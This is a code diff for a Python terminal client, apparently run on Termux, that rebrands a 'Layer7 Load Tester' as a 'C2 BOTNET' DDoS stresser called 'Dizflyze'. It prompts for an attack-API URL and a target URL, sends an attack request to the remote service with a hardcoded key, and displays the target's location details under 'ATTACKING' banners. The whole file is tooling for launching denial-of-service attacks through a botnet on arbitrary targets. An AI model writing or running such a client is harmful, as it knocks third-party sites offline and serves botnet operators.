@@ -11,31 +11,36 @@ console = Console()
 def show_banner():
     console.clear()
     console.print(Panel.fit("""
-    █▀▀ █▀█ █▀▀ ▀█▀ █▀▀ █▄░█ █▀▀ ▀█▀ █░█ █▀▀
-    █▄▄ █▀▀ ██▄ ░█░ ██▄ █░▀█ █▄▄ ░█░ █▄█ █▄█
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
+⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
+⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] C2 ATTACK
+⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v3.2.2
+⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI
+⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
+⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
+⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     """, style="bold magenta"))
-    console.print(Panel.fit("Layer7 Load Tester v3.0 - Termux Client", 
+    console.print(Panel.fit("C2 BOTNET DIZ FLYZE", 
                           style="bold yellow", padding=(1,2)))
 
 def start_attack(api_url, target):
     try:
-        with console.status("[bold green]Menginisiasi serangan...", spinner="dots12"):
-            # Dapatkan info target
+        with console.status("[bold green][ ATTACKING ]", spinner="dots12"):
             info = requests.get(f"{api_url}/info?target={target}").json()
-            
-            # Mulai serangan
             response = requests.post(
                 f"{api_url}/attack",
                 json={"target": target, "apiKey": "TERMUX_KEY"}
             )
             
             if response.status_code != 200:
-                console.print(f"[red]Error: {response.json()['error']}")
+                console.print(f"[bold red][ ERROR ] : {response.json()['error']}")
                 return None
             
             return info
     except Exception as e:
-        console.print(f"[red]Koneksi gagal: {str(e)}")
+        console.print(f"[bold red] [ GAGAL TERHUBUNG ] : {str(e)}")
         return None
 
 def show_result(info):
@@ -50,23 +55,23 @@ def show_result(info):
     table.add_row("ASN", f"{info['as']}")
     table.add_row("Zona Waktu", info['timezone'])
     table.add_row("Koordinat", f"Lat: {info['lat']}, Lon: {info['lon']}")
-    table.add_row("Status", "[bold green]BERHASIL[/]")
+    table.add_row("Status", "[bold green]SUCCESSFULY[/]")
     
     console.print(Panel.fit(table, 
-                         title="[bold yellow]Hasil Serangan", 
-                         subtitle="[green]Serangan selesai dalam 60 detik",
+                         title="[bold yellow][ HASIL ATTACKING ]", 
+                         subtitle="[bold green][ TIME ATTACK ] : [ 60 SEC ]",
                          style="bold white"))
 
 def main():
     show_banner()
-    api_url = console.input("[bold cyan]\[?][/] Masukan API URL: ")
+    api_url = console.input("[bold cyan]╔═[api]Dizflyze Streser]\n╚═══➤ " )
     
     show_banner()
-    target = console.input("[bold cyan]\[?][/] Masukan target URL: ")
+    target = console.input("[bold white]╔═[ddos]Dizflyze Streser]\n╚═══➤ ")
     
     show_banner()
     with Progress(transient=True) as progress:
-        task = progress.add_task("[red]Memulai serangan...", total=100)
+        task = progress.add_task("[bold red] [ ATTACKING ]", total=100)
         
         info = start_attack(api_url, target)
         if not info:
@@ -74,7 +79,7 @@ def main():
         
         for i in range(100):
             progress.update(task, advance=1, 
-                          description=f"[yellow]Status serangan ({i+1}%)")
+                          description=f"[bold yellow][ STATUS ] : ({i+1}%)")
             time.sleep(0.6)
     
     show_banner()
